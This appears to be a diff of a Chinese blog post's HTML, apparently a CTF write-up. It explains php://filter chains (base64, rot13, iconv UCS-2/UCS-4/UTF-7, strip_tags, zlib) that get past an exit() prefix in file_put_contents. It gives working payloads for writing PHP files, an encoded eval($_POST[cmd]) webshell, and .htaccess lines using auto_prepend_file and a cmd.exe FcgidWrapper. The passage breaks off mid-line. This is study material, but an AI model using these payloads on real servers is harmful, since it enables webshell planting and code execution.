@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="前言       昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php:&#x2F;&#x2F;filter 协议来实现的。平时，利用 php:&#x2F;&#x2F;filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php:&#x2F;&#x2F;filter 对 file_put_conte">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="前言        昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php:&#x2F;&#x2F;filter 协议来实现的。平时，利用 php:&#x2F;&#x2F;filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php:&#x2F;&#x2F;filter 对 file_put_cont">
 <meta property="og:type" content="article">
 <meta property="og:title" content="file_put_contents &amp; php:&#x2F;&#x2F;filter">
 <meta property="og:url" content="http://yoursite.com/2020/09/30/file_put_contents/index.html">
 <meta property="og:site_name" content="Whippet&#39;s Blog">
-<meta property="og:description" content="前言       昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php:&#x2F;&#x2F;filter 协议来实现的。平时，利用 php:&#x2F;&#x2F;filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php:&#x2F;&#x2F;filter 对 file_put_conte">
+<meta property="og:description" content="前言        昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php:&#x2F;&#x2F;filter 协议来实现的。平时，利用 php:&#x2F;&#x2F;filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php:&#x2F;&#x2F;filter 对 file_put_cont">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://yoursite.com/2020/09/30/file_put_contents/20201009105909.png">
 <meta property="og:image" content="http://yoursite.com/2020/09/30/file_put_contents/20201009110832.png">
@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/09/30/file_put_contents/20200930101343.png">
 <meta property="og:image" content="http://yoursite.com/2020/09/30/file_put_contents/20201010171158.png">
 <meta property="article:published_time" content="2020-09-30T02:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-10T09:15:40.890Z">
+<meta property="article:modified_time" content="2020-10-10T09:19:39.630Z">
 <meta property="article:author" content="whippet">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/09/30/file_put_contents/20201009105909.png"><title>file_put_contents &amp; php://filter | Whippet's Blog</title><link ref="canonical" href="http://yoursite.com/2020/09/30/file_put_contents/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
@@ -61,96 +61,111 @@ var CONFIG = {
 
 window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">file_put_contents &amp; php://filter</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-10-10</span></span></div></header><div class="post-body"><h2 id="前言">
           <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>
-      <p>昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 <code>php://filter</code> 协议来实现的。平时，利用 <code>php://filter</code> 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 <code>php://filter</code> 对 <code>file_put_content</code> 中几种情况的绕过方法。</p>
+      
+<p>昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 <code>php://filter</code> 协议来实现的。平时，利用 <code>php://filter</code> 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 <code>php://filter</code> 对 <code>file_put_content</code> 中几种情况的绕过方法。</p>
+<a id="more"></a>
 <ul>
-<li>file_put_contents($filename,”&lt;?php exit();”.$content);</li>
-<li>file_put_contents($content,”&lt;?php exit();”.$content);  </li>
-<li>file_put_contents($filename,$content . “\nxxxxxx”); </li>
+<li>file_put_contents($filename,"&lt;?php exit();".$content);</li>
+<li>file_put_contents($content,"&lt;?php exit();".$content);</li>
+<li>file_put_contents($filename,$content . “\nxxxxxx”);</li>
 </ul>
 
-        <h2 id="file-put-contents-filename-”-lt-php-exit-”-content">
-          <a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="heading-link"><i class="fas fa-link"></i></a>file_put_contents($filename,”&lt;?php exit();”.$content);</h2>
-      <p>首先是最为简单的一种方法，<code>$filename</code> 控制写入的文件名，<code>$content</code> 拼接在了 <code>&lt;?php exit();</code> 之后。 想要 getshell 的话，必须将前面的  <code>&lt;?php exit();</code> 闭合或者消除。 <code>$filename</code> 控制文件名，可以利用 <code>php://filter</code> 协议对 <code>$content</code> 进行解码，同时 <code>php://filter</code> 可以支持使用多个过滤器规则。实现的思路就为：将 <code>?php exit();</code> 解码成为 php 不认识的字符，构造的内容能够正常解码。</p>
+        <h2 id="file-put-contents-filename-php-exit-content">
+          <a href="#file-put-contents-filename-php-exit-content" class="heading-link"><i class="fas fa-link"></i></a>file_put_contents($filename,"&lt;?php exit();".$content);</h2>
+      
+<p>首先是最为简单的一种方法，<code>$filename</code> 控制写入的文件名，<code>$content</code> 拼接在了 <code>&lt;?php exit();</code> 之后。 想要 getshell 的话，必须将前面的  <code>&lt;?php exit();</code> 闭合或者消除。 <code>$filename</code> 控制文件名，可以利用 <code>php://filter</code> 协议对 <code>$content</code> 进行解码，同时 <code>php://filter</code> 可以支持使用多个过滤器规则。实现的思路就为：将 <code>?php exit();</code> 解码成为 php 不认识的字符，构造的内容能够正常解码。</p>
 
         <h3 id="0x01-Base64编码">
           <a href="#0x01-Base64编码" class="heading-link"><i class="fas fa-link"></i></a>0x01 Base64编码</h3>
-      <p>Base64 编码是使用64个可打印的 ASCII 字符（A-Z、a-z、0-9、+、/） 将任意字节序列化数据编码成 ASCII 字符串，另有 <code>=</code> 作为后缀的用途。同时 base64_decode 在遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。  </p>
-<p>当 <code>$content</code> 被加上<code>&lt;?php exit();</code> 之后，我们可以利用 <code>php://filter/write=convert.base64-decode</code> 来实现对其进行解码。 在进行解码的过程中不符合 base64 编码范围的字符将被忽略，所以最后被 base64 解码的字符为 <code>phpexit</code> 和我们传入的其他字符。  </p>
+      
+<p>Base64 编码是使用64个可打印的 ASCII 字符（A-Z、a-z、0-9、+、/） 将任意字节序列化数据编码成 ASCII 字符串，另有 <code>=</code> 作为后缀的用途。同时 base64_decode 在遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>当 <code>$content</code> 被加上<code>&lt;?php exit();</code> 之后，我们可以利用 <code>php://filter/write=convert.base64-decode</code> 来实现对其进行解码。 在进行解码的过程中不符合 base64 编码范围的字符将被忽略，所以最后被 base64 解码的字符为 <code>phpexit</code> 和我们传入的其他字符。</p>
 <p>由于 <code>phpexit</code> 一共七个字符，base64 在算法解码时是4个 byte 一组，所以为他随意添加一个字符（a）就可以，这样 <code>aphpexit</code> 会被 base64 正常的解析，后面传入的 webshell 也会被正常的解码。这样就会将 <code>&lt;?php exit();</code> 这部分内容被正常的解码，不会影响后面写入的 webshell 的内容。</p>
-<p><img src="/2020/09/30/file_put_contents/20201009105909.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201009105909.png" alt></p>
 
         <h3 id="0x02-Rot13编码">
           <a href="#0x02-Rot13编码" class="heading-link"><i class="fas fa-link"></i></a>0x02 Rot13编码</h3>
-      <p><code>&lt;?php exit();</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc rkvg();</code> ，通过再传入一个 <code>?&gt;</code> 将其闭合 同时，在 php 不开启 <code>short_open_tag</code> 短标签时，php 无法识别这个字符串。</p>
-<p><img src="/2020/09/30/file_put_contents/20201009110832.png"></p>
+      
+<p><code>&lt;?php exit();</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc rkvg();</code> ，通过再传入一个 <code>?&gt;</code> 将其闭合 同时，在 php 不开启 <code>short_open_tag</code> 短标签时，php 无法识别这个字符串。</p>
+<p><img src="/2020/09/30/file_put_contents/20201009110832.png" alt></p>
 
         <h3 id="0x03-htaccess的预包含利用">
           <a href="#0x03-htaccess的预包含利用" class="heading-link"><i class="fas fa-link"></i></a>0x03 .htaccess的预包含利用</h3>
-      <p>利用 <code>.htaccess</code> 的预包含文件功能，自定义包含文件。</p>
+      
+<p>利用 <code>.htaccess</code> 的预包含文件功能，自定义包含文件。</p>
 <p>看到网上的文章的利用方法为</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">'php://filter/write=string.strip_tags/resource=.htaccess'</span></span><br><span class="line">$content=<span class="string">'?&gt;php_value%20auto_prepend_file%20G:\s1mple.php'</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p>我尝试了多次之后无法利用成功，随即又被指导另一种方法<br>在 .htaccess 中写入</p>
+<p>我尝试了多次之后无法利用成功，随即又被指导另一种方法<br>
+在 .htaccess 中写入</p>
 <pre><code>Options +ExecCGI
 AddHandler fcgid-script .abc
-FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc</code></pre>
+FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc
+</code></pre>
 <p>然后再随意生成一个 .abc 后缀的文件，访问就可以打开 cmd 控制框。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">'php://filter/string.strip_tags|convert.base64-decode/resource=.htaccess'</span></span><br><span class="line">$content=<span class="string">'?&gt;T3B0aW9ucyArRXhlY0NHSQ0KQWRkSGFuZGxlciBmY2dpZC1zY3JpcHQgLmFiYw0KRmNnaWRXcmFwcGVyICJDOi9XaW5kb3dzL1N5c3RlbTMyL2NtZC5leGUgL2Mgc3RhcnQgY21kLmV4ZSIgLmFiYw=='</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p><img src="/2020/09/30/file_put_contents/20201009154521.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201009154521.png" alt></p>
 <p>emmmm，这样似乎多此一举，为什么我不直接写一个shell进去呢，而要采用这种比较麻烦的利用方式，还是要想办法找出之前的利用方法一直无法成功的原因。</p>
 <p>不断不断测试，发现是自己的 windows 机器上没有开启对 <code>php_value</code> 的支持，配置了好久发现无法成功，于是采用 ubuntu 环境进行测试。</p>
-<p><img src="/2020/09/30/file_put_contents/20201010163958.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201010163958.png" alt></p>
 <p><code>http://192.168.176.128/?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?%3Ephp_value%20auto_prepend_file%20flag</code></p>
-<p><img src="/2020/09/30/file_put_contents/20201010164338.png"><br><img src="/2020/09/30/file_put_contents/20201010164242.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201010164338.png" alt><br>
+<img src="/2020/09/30/file_put_contents/20201010164242.png" alt></p>
 
         <h3 id="0x04-过滤器编码组合利用">
           <a href="#0x04-过滤器编码组合利用" class="heading-link"><i class="fas fa-link"></i></a>0x04 过滤器编码组合利用</h3>
-      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   </p>
-<p>利用 <code>strip_tags — 从字符串中去除 HTML 和 PHP 标记</code> </p>
+      
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>利用 <code>strip_tags — 从字符串中去除 HTML 和 PHP 标记</code></p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">'php://filter/string.strip_tags|convert.base64-decode/resource=whippet.php '</span>;</span><br><span class="line">$content = <span class="string">'?&gt;PD9waHAgcGhwaW5mbygpOz8+'</span>;</span><br></pre></td></tr></tbody></table></div></figure>
-
-<p><img src="/2020/09/30/file_put_contents/20201009135740.png"></p>
-<p><img src="/2020/09/30/file_put_contents/20201009140315.png"></p>
-<p>利用 <code>string.strip_tags</code> 过滤掉 html 标签，将标签内的所有内容删除，然后再进行 base64 解码，成功写入 php 文件。<br>但是 <code>string.strip_tags</code> 在 php7.3.0 以上的环境会发生错误，无法写入，但在 php5 的环境下不受影响。</p>
+<p><img src="/2020/09/30/file_put_contents/20201009135740.png" alt></p>
+<p><img src="/2020/09/30/file_put_contents/20201009140315.png" alt></p>
+<p>利用 <code>string.strip_tags</code> 过滤掉 html 标签，将标签内的所有内容删除，然后再进行 base64 解码，成功写入 php 文件。<br>
+但是 <code>string.strip_tags</code> 在 php7.3.0 以上的环境会发生错误，无法写入，但在 php5 的环境下不受影响。</p>
 <p>利用压缩过滤器，组合使用压缩后再解压内容肯定不变，但是在中间再加入别的过滤器就有可能绕过</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">'php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=whippet.php'</span>;</span><br><span class="line">$content = <span class="string">'?&gt;&lt;?php phpinfo();?&gt;'</span>;</span><br></pre></td></tr></tbody></table></div></figure>
+<p><img src="/2020/09/30/file_put_contents/20201009142318.png" alt></p>
 
-<p><img src="/2020/09/30/file_put_contents/20201009142318.png"></p>
-
-        <h2 id="file-put-contents-content-”-lt-php-exit-”-content">
-          <a href="#file-put-contents-content-”-lt-php-exit-”-content" class="heading-link"><i class="fas fa-link"></i></a>file_put_contents($content,”&lt;?php exit();”.$content);</h2>
-      <p>这种情况主要是针对于写入的 shell 的文件名和文件内容变量相同时的一种绕过，这种方式需要考虑文件名和文件内容数据的兼容性。</p>
+        <h2 id="file-put-contents-content-php-exit-content">
+          <a href="#file-put-contents-content-php-exit-content" class="heading-link"><i class="fas fa-link"></i></a>file_put_contents($content,"&lt;?php exit();".$content);</h2>
+      
+<p>这种情况主要是针对于写入的 shell 的文件名和文件内容变量相同时的一种绕过，这种方式需要考虑文件名和文件内容数据的兼容性。</p>
 
         <h3 id="0x01-Base64编码-无法利用">
           <a href="#0x01-Base64编码-无法利用" class="heading-link"><i class="fas fa-link"></i></a>0x01 Base64编码  (无法利用)</h3>
-      <p>仅仅只利用 base64 编码的方式是无法利用成功的，利用 <code>php://filter</code> 来构造 POC ，后面属于写入的内容，只要在解码的时候把传入的 shell 正常解码出来，不需要的东西解析成乱码。base64 构造的 poc。   </p>
+      
+<p>仅仅只利用 base64 编码的方式是无法利用成功的，利用 <code>php://filter</code> 来构造 POC ，后面属于写入的内容，只要在解码的时候把传入的 shell 正常解码出来，不需要的东西解析成乱码。base64 构造的 poc。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="string">"php://filter/convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=whippet.php"</span></span><br><span class="line">$content = <span class="string">"php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php"</span></span><br></pre></td></tr></tbody></table></div></figure>
-
 <p>构造的shell 可以放在过滤器的位置和文件名的位置都是可以的， <code>php://filter</code> 在面对不可用的规则时仅仅报 Warning，然后跳过继续执行。所以构造是没有太大的问题的。但是测试发现，虽然可以生成文件，但是生成的文件内部为空。</p>
 <p>我们可以将要进行 base64 解码的数据提取出来进行分析</p>
 <p><code>phpexitphp//filter/convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=whippet.php</code></p>
 <p>我们注意到在数据中存在 <code>=</code>，默认情况之下 <code>=</code> 在 base64编码中起填充作用，也就意味着结束了。在利用协议时 resource 关键字，不可或缺，所以会导致过滤器解码失败，会首先创建文件，但是解码过程出错，内容全部抛弃，所以仅仅会创建一个空文件。</p>
 <p>简单验证一下 <code>=</code> 在 base64解码中所产生的影响</p>
 <figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+")</span><br><span class="line">&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=")</span><br><span class="line">&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=a")</span><br></pre></td></tr></tbody></table></div></figure>
-
-<p><img src="/2020/09/30/file_put_contents/20201009171822.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201009171822.png" alt></p>
 <p>验证之后发现，在 base64 解码时字符 <code>=</code> 后面不能包含有其他的字符。</p>
 
-        <h3 id="0x02-Rot13编码-1">
-          <a href="#0x02-Rot13编码-1" class="heading-link"><i class="fas fa-link"></i></a>0x02 Rot13编码</h3>
-      <p>rot13 编码就不存在 base64 编码的问题，所以可以轻松构造出<br><code>$content = "php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=whippet.php"</code><br><img src="/2020/09/30/file_put_contents/20201009173852.png"></p>
+        <h3 id="0x02-Rot13编码-2">
+          <a href="#0x02-Rot13编码-2" class="heading-link"><i class="fas fa-link"></i></a>0x02 Rot13编码</h3>
+      
+<p>rot13 编码就不存在 base64 编码的问题，所以可以轻松构造出<br>
+<code>$content = "php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=whippet.php"</code><br>
+<img src="/2020/09/30/file_put_contents/20201009173852.png" alt></p>
 
         <h3 id="0x03-iconv字符编码转换">
           <a href="#0x03-iconv字符编码转换" class="heading-link"><i class="fas fa-link"></i></a>0x03 iconv字符编码转换</h3>
-      <p><code>convert.iconv.</code> 这个过滤器需要 php 支持 <code>iconv</code>。使用 <code>convert.iconv.*</code> 过滤器等同于使用 <code>iconv()</code> 函数处理所有的流数据。  </p>
-<p><img src="/2020/09/30/file_put_contents/20201009174808.png"></p>
-<p><strong>usc-2</strong><br>通过 <code>usc-2</code> 的编码进行转换，对目标字符串进行2位一反转，因为是两位一反转，所以字符的数目需要保持在偶数位上。</p>
+      
+<p><code>convert.iconv.</code> 这个过滤器需要 php 支持 <code>iconv</code>。使用 <code>convert.iconv.*</code> 过滤器等同于使用 <code>iconv()</code> 函数处理所有的流数据。</p>
+<p><img src="/2020/09/30/file_put_contents/20201009174808.png" alt></p>
+<p><strong>usc-2</strong><br>
+通过 <code>usc-2</code> 的编码进行转换，对目标字符串进行2位一反转，因为是两位一反转，所以字符的数目需要保持在偶数位上。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo iconv("UCS-2LE","UCS-2BE",'&lt;?php phpinfo();?&gt;');  </span></span><br><span class="line">?&lt;hp phpipfn(o;)&gt;?</span><br></pre></td></tr></tbody></table></div></figure>
-
-<p><code>$content = "php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet.php"</code><br><img src="/2020/09/30/file_put_contents/20201009175802.png"></p>
-<p><strong>usc-4</strong><br>通过 <code>usc-4</code> 的编码进行转换，对目标字符串进行4位一反转；所以构造的 shell 的代码数目应该是4的倍数，同时也要保证shell之前的字符串也应该为4个字符一组。</p>
+<p><code>$content = "php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet.php"</code><br>
+<img src="/2020/09/30/file_put_contents/20201009175802.png" alt></p>
+<p><strong>usc-4</strong><br>
+通过 <code>usc-4</code> 的编码进行转换，对目标字符串进行4位一反转；所以构造的 shell 的代码数目应该是4的倍数，同时也要保证shell之前的字符串也应该为4个字符一组。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo iconv("UCS-4LE","UCS-4BE",'aa&lt;?php phpinfo();?&gt;');</span></span><br><span class="line">?&lt;aa phpiphp(ofn&gt;?;)</span><br></pre></td></tr></tbody></table></div></figure>
 <p><code>$content = "php://filter/convert.iconv.UCS-4LE.UCS-4BE|?&lt;aa phpiphp(ofn&gt;?;)|/resource=whippet.php"</code></p>
-<p><img src="/2020/09/30/file_put_contents/20201009181057.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201009181057.png" alt></p>
 <p><strong>utf8-utf7</strong></p>
 <p>convert.iconv 这个过滤器会把 <code>=</code> 转换为 <code>+AD0-</code>，而 <code>+AD0-</code> 是可以被 base64 进行解码的。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo iconv("UTF-8","UTF-7","=");</span></span><br><span class="line">+AD0-SSS</span><br><span class="line"><span class="comment">#echo iconv("UTF-8","UTF-7","PD9waHAgcGhwaW5mbygpOz8+");</span></span><br><span class="line">PD9waHAgcGhwaW5mbygpOz8+-</span><br></pre></td></tr></tbody></table></div></figure>
@@ -158,82 +173,111 @@ FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc</code></pre>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">utf<span class="number">-8</span>:<span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php</span></span><br><span class="line">:point_down:</span><br><span class="line">utf<span class="number">-7</span>:+ADw?php <span class="keyword">exit</span>()+ADs-php:<span class="comment">//filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-PD9waHAgcGhwaW5mbygpOz8+--+AHw-/resource+AD0-whippet.php</span></span><br></pre></td></tr></tbody></table></div></figure>
 <p>//这里需要注意的是要符合base64解码按照4字节进行的，base64解码特点剔除不符合字符（只要恶意代码前面部分正常就可以，长度为4的倍数）</p>
 <figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len("+ADwphpexit+ADsphp//filter/converticonvutf8utf7+AHwconvertbase6-decode+AHw")</span><br><span class="line">74</span><br><span class="line">&gt;&gt;&gt; 74/4</span><br><span class="line">18.5</span><br></pre></td></tr></tbody></table></div></figure>
-<p>所以在恶意代码之前添加两个字符满足解码条件。<br><code>$content="php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php"</code></p>
-<p><img src="/2020/09/30/file_put_contents/20201010110017.png"></p>
+<p>所以在恶意代码之前添加两个字符满足解码条件。<br>
+<code>$content="php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php"</code></p>
+<p><img src="/2020/09/30/file_put_contents/20201010110017.png" alt></p>
 
-        <h3 id="0x04-过滤器编码组合利用-1">
-          <a href="#0x04-过滤器编码组合利用-1" class="heading-link"><i class="fas fa-link"></i></a>0x04 过滤器编码组合利用</h3>
-      <p><strong>UCS-2&amp;rot13</strong></p>
+        <h3 id="0x04-过滤器编码组合利用-2">
+          <a href="#0x04-过滤器编码组合利用-2" class="heading-link"><i class="fas fa-link"></i></a>0x04 过滤器编码组合利用</h3>
+      
+<p><strong>UCS-2&amp;rot13</strong></p>
 <p><code>$content = "php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;uc cucvcsa(b;)&gt;?|string.rot13/resource=whippet.php"</code></p>
 <p><strong>strip_tags&amp;base64</strong>   (仅可在linux下利用成功)</p>
-<p><strong><em>①</em></strong></p>
+<p><em><strong>①</strong></em></p>
 <p><code>&lt;?php exit(); ?&gt;</code> 可以直接利用 <code>strip_tags</code> 去除，尝试构造 payload。</p>
 <p><code>$content="php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php"</code></p>
-<p>代码合并之后为<br><code>&lt;?php exit(); php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code>   </p>
-<p>分析合并之后的代码文件内容，发现成功构造 php 标签 <code>&lt;?php ?&gt;</code> ，同时也会发现代码中的字符 <code>=</code> 也被包含在 php 标签内，经过 <code>strip_tags</code> 处理之后都会删除，就不会影响 base64 的解码了。<br><img src="/2020/09/30/file_put_contents/20201010140559.png"></p>
-<p>虽然这样生成成功，但是因为文件名为 <code>'?&gt;PD9waHAgcGhwaW5mbygpOz8+.php'</code> ，在浏览器访问时，会出现访问不到的问题，主要是因为存在引号。可以通过利用伪目录的方法进行变相的绕过。   </p>
-<p><code>$content="php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php"</code><br><img src="/2020/09/30/file_put_contents/20201010141634.png"></p>
+<p>代码合并之后为<br>
+<code>&lt;?php exit(); php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></p>
+<p>分析合并之后的代码文件内容，发现成功构造 php 标签 <code>&lt;?php ?&gt;</code> ，同时也会发现代码中的字符 <code>=</code> 也被包含在 php 标签内，经过 <code>strip_tags</code> 处理之后都会删除，就不会影响 base64 的解码了。<br>
+<img src="/2020/09/30/file_put_contents/20201010140559.png" alt></p>
+<p>虽然这样生成成功，但是因为文件名为 <code>'?&gt;PD9waHAgcGhwaW5mbygpOz8+.php'</code> ，在浏览器访问时，会出现访问不到的问题，主要是因为存在引号。可以通过利用伪目录的方法进行变相的绕过。</p>
+<p><code>$content="php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php"</code><br>
